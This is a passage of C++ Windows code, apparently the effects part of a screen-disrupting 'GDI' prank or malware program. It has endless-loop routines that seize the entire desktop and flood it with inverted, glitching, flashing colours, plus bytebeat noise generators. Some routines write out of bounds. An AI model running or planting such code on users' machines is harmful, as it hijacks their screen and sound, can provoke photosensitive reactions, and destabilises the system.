        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        i++, xxx += 2;
    }
}

DWORD WINAPI shader11(LPVOID lpParam) {
    PRGBTRIPLE rgbtriple;
    int xxx = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 40, w, h, 1, 24 };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, 0, (void**)&rgbtriple, 0, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w, t = (x | y);
            rgbtriple[i].rgbtRed -= t + x + xxx;
            rgbtriple[i].rgbtGreen -= t + i + xxx;
            rgbtriple[i].rgbtBlue -= t + y + xxx;
        }
        for (int y = 0; y < h; y++) {
            StretchBlt(hcdc, -2 + rand() % 5, y, w, 1, hcdc, 0, y, w, 1, SRCCOPY);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        xxx += 2;
    }
    return 0;
}

DWORD WINAPI shader12(LPVOID lpParam) {
    int xxx = 0;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(_RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        _RGBQUAD* data = (_RGBQUAD*)MyMemoryAddress;
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        GetBitmapBits(hBitmap, w * h * 4, data);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            data[i].r *= i;
            data[i].g ^= i;
            data[i].b |= i;
            data[i].rgb += 1145 ^ (i + ((x + xxx) ^ (y + xxx)));
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
        xxx++;
    }
    return 0;
}

DWORD WINAPI hell1(LPVOID lpParam) {
    int µ = M_PI, i = 10;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int y = 0; y < h; y++) {
            int x = cos(y + i * µ) * 40;
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCERASE);
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCINVERT);
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCPAINT);
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, NOTSRCERASE);
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i += 2;
    }
}

DWORD WINAPI swirl(LPVOID lpParam) {
    double angle = 0;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCINVERT);
        for (float i = 0; i < w; i += 0.99f) {
            int a = cos(angle) * 40;
            BitBlt(hcdc, i, 0, 1, h, hcdc, i, a, SRCPAINT);
            angle += M_PI / 800;
        }
        for (float i = 0; i < h; i += 0.99f) {
            int a = cos(angle) * 40;
            BitBlt(hcdc, 0, i, w, 1, hcdc, a, i, SRCPAINT);
            angle += M_PI / 800;
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
}

DWORD WINAPI shader13(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 }; bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * x + w;
                int fx = (int)((11 ^ i) + ((11 - i) * sqrt(x - 15)) + (9 * i) + ((6 * i) * tan(y + 44)));
                rgbquad[index].rgbRed += fx;
                rgbquad[index].rgbGreen += fx;
                rgbquad[index].rgbBlue += fx;
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i++;
    }
}

DWORD WINAPI shader14(LPVOID lpParam) {
    int i = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
        RGBQUAD* rgbquad = NULL;
        HSL hslcolor;
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = y + (i * 40);
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / h * .10f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        i++;
    }
}

DWORD WINAPI blur(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        BitBlt(hcdc, 3, 3, w, h, hcdc, 0, 0, 0x111111);
        BitBlt(hcdc, -3, -3, w, h, hcdc, 0, 0, SRCCOPY);
        BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 50, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
    }
}

DWORD WINAPI swirl1(LPVOID lpParam) {
    int i = 0;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int x = 0; x < w; x++) {
            float y = sin((x + i) * (M_PI / 20)) * 33;
            BitBlt(hcdc, x, y, 1, h, hcdc, x, 0, SRCINVERT);
        }
        for (int y = 0; y < h; y++) {
            float x = sin((y + i) * (M_PI / 20)) * 33;
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCINVERT);
        }
        BLENDFUNCTION blur = { AC_SRC_OVER, 0, 80, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hdc); DeleteDC(hcdc);
        i++;
    }
}

DWORD WINAPI shader15(LPVOID lpParam) {
    int xxx = 0;
    bool jntm = false;
    HDC hcdc2 = 0;
    HBITMAP hBitmap2 = 0;
    while (true) {
        jntm = false;
        if (rand() % 20 > 15) { jntm = true; }
        int randrgb = RGB(rand() % 255, rand() % 255, rand() % 255);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        if (jntm == true) { hcdc2 = CreateCompatibleDC(hdc); }
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        if (jntm == true) { hBitmap2 = CreateCompatibleBitmap(hdc, w, h); }
        SelectObject(hcdc, hBitmap);
        if (jntm == true) { SelectObject(hcdc2, hBitmap2); }
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        if (jntm == true) { BitBlt(hcdc2, 0, 0, w, h, hcdc, 0, 0, SRCCOPY); }
        if (jntm == true) {
            StretchBlt(hcdc, 0, 0, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
            StretchBlt(hcdc, w / 2, 0, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
            StretchBlt(hcdc, 0, h / 2, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
            StretchBlt(hcdc, w / 2, h / 2, w / 2, h / 2, hcdc2, 0, 0, w, h, SRCCOPY);
            for (int bl = 0; bl < h; bl += 2) {
                StretchBlt(hcdc, -2 + rand() % 5, bl, w, 2, hcdc, 0, bl, w, 2, SRCCOPY);
            }
        }
        for (int x = 0; x < w; x += 40) {
            for (int y = 0; y < h; y += 40) {
                StretchBlt(hcdc, x, y, 40, 40, hcdc, x, y, 20, 20, SRCCOPY);
            }
        }
        for (int i = 0; i < w * h; i++) {
            int jntm = i % w ^ i / w;
            rgbScreen[i].rgb ^= randrgb - ((jntm * xxx) % 114);
        }
        BLENDFUNCTION blf = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blf);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        if (jntm == true) { ReleaseDC(0, hcdc2); }
        DeleteObject(hBitmap);
        if (jntm == true) { DeleteObject(hBitmap2); }
        DeleteDC(hcdc);
        if (jntm == true) { DeleteDC(hcdc2); }
        DeleteDC(hdc);
    }
}

DWORD WINAPI shader16(LPVOID lpParam) {
    int xxx = 0;
    while (true) {
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = i % w, y = i / w;
            rgbScreen[i].rgb += (((x ^ i) - xxx) * ((y ^ i) - xxx));
        }
        BLENDFUNCTION blur = BLENDFUNCTION{ AC_SRC_OVER, 1, 80, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        xxx++;
    }
}

DWORD WINAPI shader17(LPVOID lpParam) {
    int size = 450, xxx = 0, rop = NULL;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        BITMAPINFO bmi = { 0 };
        PRGBQUAD rgbScreen = { 0 };
        bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
        HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
        for (int i = 0; i < w * h; i++) {
            int x = (i * i * 2) % w, y = (i | i * 2) ^ w;
            rgbScreen[i].rgb ^= (x * y) & (i + w + h) * i;
        }
        rop = SRCCOPY;
        int luckynum = rand() % 5;
        if (luckynum == 2) { rop = SRCAND; }
        else if (luckynum == 4) { rop = SRCPAINT; }
        BitBlt(hcdc, rand() % 5, rand() % 5, w, h, hcdc, rand() % 5, rand() % 5, rop);
        for (int i = 0; i < 10; i++) {
            int x = -size + rand() % (w + size);
            int y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCAND);
        }
        for (int i = 0; i < 10; i++) {
            int x = -size + rand() % (w + size);
            int y = -size + rand() % (h + size);
            BitBlt(hcdc, x, y, size, size, hcdc, x + rand() % 20 - 9, y + rand() % 20 - 9, SRCPAINT);
        }
        for (int y = 0; y < h; y++) {
            int wow = (double)y / 20.0 * (double)xxx;
            int x = (int)(cos(wow) * 40.0);
            BitBlt(hcdc, x, y, w, 1, hcdc, 0, y, SRCCOPY);
        }
        for (int kun = 0; kun < 4; kun++) {
            int rw = rand() % w, rh = rand() % h;
            int tw = 0 + rw, th = 0 + rh;
            int bw = 100 + rw, bh = 100 + rh;
            HRGN circle = CreateEllipticRgn(tw, th, bw, bh);
            InvertRgn(hcdc, circle);
            DeleteObject(circle);
        }
        BLENDFUNCTION blur = { AC_SRC_OVER, 0, 60, 0 };
        AlphaBlend(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, blur);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        xxx++;
    }
}

DWORD WINAPI shader18(LPVOID lpParam) {
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        LPVOID MyMemoryAddress = VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        RGBQUAD* data = (RGBQUAD*)MyMemoryAddress;
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateBitmap(w, h, 1, 32, data);
        SelectObject(hcdc, hBitmap);
        BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCERASE);
        GetBitmapBits(hBitmap, w * h * 4, data);
        int v = 0;
        BYTE byte = rand() % 255;
        for (int i = 0; w * h > i; i++) {
            v = rand() % 114;
            *((BYTE*)data + 4 * i + v) -= 1;
        }
        SetBitmapBits(hBitmap, w * h * 4, data);
        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
        ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc); DeleteDC(hdc);
        VirtualFree(MyMemoryAddress, 0, MEM_RELEASE);
    }
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(cbrt(cos((t * (1 + (t >> 14 | t >> 51) % 4)) / 19)) * (16 + (t >> 8 & 42)) + int(sin((t * t * t / 9) / 41) * 10) + 70);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t ^ 64 | (4 * t) ^ (t >> 5));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> t / (11 + ((t >> 45 | t >> 14) & 128)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> (t << t >> (t << t)) >> (t >> (t >> t) << t >> (t >> t)) << (t >> t) << (t >> t)) | t >> t | t * rand());

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((((t / 4 * ((t >> 12 ^ (t >> 12) - 2) % 11) | t >> 13) & 126) + (t / 4 * (0x98646363 >> (t >> 11 & 28) & 15) & 128)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(11 * t + 12 ^ t * (4 << ((t >> 11 ^ (t >> 54) + (t >> 12)) + 22) % 5));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound7() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(4E5 * t / (t >> 2 ^ t >> 12));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound8() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((114 % 514 * (t * ((t >> 6) | (t << 2)))));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound9() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t - ((t >> (t & 1142 ? 1 : 1) >> 1) & t >> 10) * t));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound10() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((sin(t >> 5 | t >> 8) * t * 3.3));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound11() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(sin((t + 2) / 2 | t >> 12) * 256);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound12() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((5 * t) & (t >> 5) | (3 * t) & (t >> 11));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound13() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((((t * (42 & t >> 10)) + (t * (42 & t >> 10)) % 127) + (t | t % 255 | t % 257) + (t & t >> 8)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound14() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t << (t >> 11 & 1)) + (t << (t >> 45 & 14)) + (t << (t >> 11 & 45)) | t * rand());

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound15() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 1) * (t >> 14) | t >> 51 ^ t >> 4);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound16() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t & 56) * (t >> 8) ^ t & t >> 7);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
